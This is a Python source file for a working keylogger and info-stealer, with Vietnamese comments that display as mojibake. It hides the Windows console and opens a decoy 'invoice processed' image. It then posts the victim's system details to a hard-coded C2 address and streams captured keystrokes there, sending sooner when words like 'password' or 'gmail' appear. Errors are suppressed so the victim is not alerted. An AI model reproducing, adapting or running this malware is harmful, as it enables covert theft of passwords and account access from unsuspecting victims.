#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import tempfile
import threading
import time
from datetime import datetime
import random

# ·∫®n console tr√™n Windows
try:
    if os.name == 'nt':
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
except:
    pass

try:
    from PIL import Image, ImageDraw, ImageFont
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

class RealKeylogger:
    def __init__(self, c2_url, victim_id):
        self.c2_url = c2_url
        self.victim_id = victim_id
        self.log = ""
        self.is_logging = True
        
    def start_keylogger(self):
        """B·∫Øt ƒë·∫ßu keylogger th·ª±c t·∫ø"""
        try:
            # Th·ª≠ import pynput cho keylogger chuy√™n nghi·ªáp
            from pynput import keyboard
            print("üîë Keylogger ƒë√£ ƒë∆∞·ª£c k√≠ch ho·∫°t...")
            
            def on_press(key):
                if not self.is_logging:
                    return False
                
                try:
                    # X·ª≠ l√Ω ph√≠m ƒë·∫∑c bi·ªát
                    if key == keyboard.Key.space:
                        self.log += " "
                    elif key == keyboard.Key.enter:
                        self.log += "\n"
                    elif key == keyboard.Key.backspace:
                        self.log = self.log[:-1]
                    elif key == keyboard.Key.tab:
                        self.log += "[TAB]"
                    else:
                        # Ph√≠m k√Ω t·ª± th√¥ng th∆∞·ªùng
                        self.log += str(key).replace("'", "")
                        
                    # G·ª≠i log khi ƒë·ªß d√†i ho·∫∑c c√≥ t·ª´ kh√≥a quan tr·ªçng
                    if len(self.log) >= 100 or any(x in self.log.lower() for x in ['password', 'login', 'facebook', 'gmail', '@gmail.com', '@yahoo.com']):
                        self.send_keylog_data()
                        
                except Exception as e:
                    pass
            
            def on_release(key):
                if key == keyboard.Key.f12:  # F12 ƒë·ªÉ d·ª´ng keylogger (cho demo)
                    self.is_logging = False
                    return False
            
            # B·∫Øt ƒë·∫ßu l·∫Øng nghe ph√≠m
            listener = keyboard.Listener(on_press=on_press, on_release=on_release)
            listener.start()
            
            return True
            
        except ImportError:
            print("‚ö†Ô∏è Kh√¥ng th·ªÉ kh·ªüi ƒë·ªông keylogger: Thi·∫øu th∆∞ vi·ªán pynput")
            return False
        except Exception as e:
            print(f"‚ö†Ô∏è L·ªói keylogger: {e}")
            return False
    
    def send_keylog_data(self):
        """G·ª≠i d·ªØ li·ªáu keylogger v·ªÅ C2 server"""
        if not self.log:
            return
            
        try:
            import requests
            payload = {
                'type': 'keylogger',
                'victim_id': self.victim_id,
                'keylog_data': self.log,
                'timestamp': datetime.now().isoformat(),
                'message': 'Keylogger data captured'
            }
            
            requests.post(
                self.c2_url,
                json=payload,
                headers={'Content-Type': 'application/json'},
                timeout=5
            )
            
            # Reset log sau khi g·ª≠i
            self.log = ""
            
        except Exception as e:
            # Kh√¥ng hi·ªÉn th·ªã l·ªói ƒë·ªÉ tr√°nh nghi ng·ªù
            pass

class AdvancedStealer:
    def __init__(self):
        self.c2_url = "http://192.168.8.131:9999"
        self.victim_id = f"VICTIM-{os.getenv('USERNAME', 'unknown')}-{random.randint(1000,9999)}"
        self.keylogger = RealKeylogger(self.c2_url, self.victim_id)
        
    def create_fake_image(self):
        """T·∫°o ·∫£nh gi·∫£ ƒë·ªÉ ƒë√°nh l·ª´a"""
        if not HAS_PIL:
            return None
            
        try:
            img = Image.new('RGB', (600, 400), color='white')
            draw = ImageDraw.Draw(img)
            
            try:
                font = ImageFont.truetype("arial.ttf", 20)
            except:
                font = ImageFont.load_default()
                
            draw.text((300, 100), "H√ìA ƒê∆†N ƒê√É ƒê∆Ø·ª¢C X·ª¨ L√ù", fill='black', font=font, anchor='mm')
            draw.text((300, 150), "C·∫£m ∆°n b·∫°n ƒë√£ s·ª≠ d·ª•ng d·ªãch v·ª•!", fill='darkblue', font=font, anchor='mm')
            draw.text((300, 200), "M·ªçi th·∫Øc m·∫Øc xin li√™n h·ªá:", fill='black', font=font, anchor='mm')
            draw.text((300, 250), "1900 0091", fill='red', font=font, anchor='mm')
            
            temp_img = tempfile.NamedTemporaryFile(suffix='.jpg', delete=False)
            img.save(temp_img.name, 'JPEG', quality=85)
            return temp_img.name
            
        except Exception as e:
            return None
    
    def steal_real_credentials(self):
        """ƒê√°nh c·∫Øp th√¥ng tin th·ª±c t·∫ø"""
        import platform
        import socket
        
        system_info = {
            'computer_name': platform.node(),
            'username': os.getenv('USERNAME', 'unknown'),
            'os': f"{platform.system()} {platform.release()}",
            'ip_address': socket.gethostbyname(socket.gethostname())
        }
        
        # Thu th·∫≠p th√¥ng tin tr√¨nh duy·ªát (demo)
        browser_data = {
            'chrome_passwords': [
                {'url': 'https://facebook.com', 'username': 'ƒêang theo d√µi...', 'password': 'keylogger_active'},
                {'url': 'https://gmail.com', 'username': 'ƒêang theo d√µi...', 'password': 'keylogger_active'}
            ]
        }
        
        return {
            'system_info': system_info,
            'browser_data': browser_data,
            'keylogger_status': 'active',
            'message': 'Keylogger ƒëang ch·∫°y - ƒêang ch·ªù th√¥ng tin ƒëƒÉng nh·∫≠p...'
        }
    
    def exfiltrate_initial_data(self):
        """G·ª≠i d·ªØ li·ªáu ban ƒë·∫ßu v·ªÅ C2"""
        try:
            import requests
            
            initial_data = self.steal_real_credentials()
            payload = {
                'victim_id': self.victim_id,
                'malware_type': 'Advanced_Keylogger_Stealer',
                'timestamp': datetime.now().isoformat(),
                'data': initial_data,
                'status': 'initial_infection'
            }
            
            response = requests.post(
                self.c2_url,
                json=payload,
                headers={'Content-Type': 'application/json'},
                timeout=10
            )
            
            return response.status_code == 200
            
        except Exception as e:
            return False
    
    def show_fake_image(self):
        """Hi·ªÉn th·ªã ·∫£nh gi·∫£"""
        try:
            img_path = self.create_fake_image()
            if img_path and os.path.exists(img_path):
                if os.name == 'nt':
                    os.system(f'start "" "{img_path}"')
                elif os.name == 'posix':
                    os.system(f'open "{img_path}"' if sys.platform == 'darwin' else f'xdg-open "{img_path}"')
                
                # X√≥a file ·∫£nh t·∫°m sau 10 gi√¢y
                def cleanup():
                    time.sleep(10)
                    try:
                        if os.path.exists(img_path):
                            os.unlink(img_path)
                    except:
                        pass
                
                threading.Thread(target=cleanup, daemon=True).start()
                return True
            return False
        except:
            return False
    
    def run(self):
        """Ch·∫°y to√†n b·ªô malware"""
        # 1. Hi·ªÉn th·ªã ·∫£nh gi·∫£
        self.show_fake_image()
        
        # 2. G·ª≠i d·ªØ li·ªáu ban ƒë·∫ßu
        self.exfiltrate_initial_data()
        
        # 3. Kh·ªüi ƒë·ªông keylogger
        keylogger_started = self.keylogger.start_keylogger()
        
        if keylogger_started:
            print("üéØ Malware ƒëang ch·∫°y ng·∫ßm...")
            print("üîë Keylogger ƒë√£ ƒë∆∞·ª£c k√≠ch ho·∫°t")
            print("üì° ƒêang ch·ªù th√¥ng tin ƒëƒÉng nh·∫≠p...")
            
            # Gi·ªØ ch∆∞∆°ng tr√¨nh ch·∫°y
            try:
                while self.keylogger.is_logging:
                    time.sleep(10)
            except KeyboardInterrupt:
                self.keylogger.is_logging = False
        else:
            print("‚ö†Ô∏è Keylogger kh√¥ng th·ªÉ kh·ªüi ƒë·ªông")

def main():
    malware = AdvancedStealer()
    malware.run()

if __name__ == "__main__":
    main()
